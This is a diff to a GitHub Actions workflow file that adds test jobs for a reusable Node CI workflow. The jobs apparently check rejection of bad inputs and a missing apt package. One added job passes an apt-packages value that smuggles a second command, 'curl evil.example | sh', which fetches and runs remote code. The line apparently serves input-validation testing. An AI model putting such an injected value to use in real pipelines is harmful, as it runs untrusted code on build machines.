@@ -43,6 +43,18 @@ jobs:
     with:
       working-directory: fixtures/node-npm
       env: 1BAD=x
+  node-bad-apt:
+    uses: ./.github/workflows/node-ci.yml
+    with:
+      working-directory: fixtures/node-npm
+      apt-packages: libfoo; curl evil.example | sh
+  node-apt-missing:
+    # The fixture self-test runs with `apt-packages: figlet`, without it.
+    uses: ./.github/workflows/node-ci.yml
+    with:
+      working-directory: fixtures/node-apt
+      scripts: test
+      require: test
   node-audit-fail:
     uses: ./.github/workflows/node-ci.yml
     with:
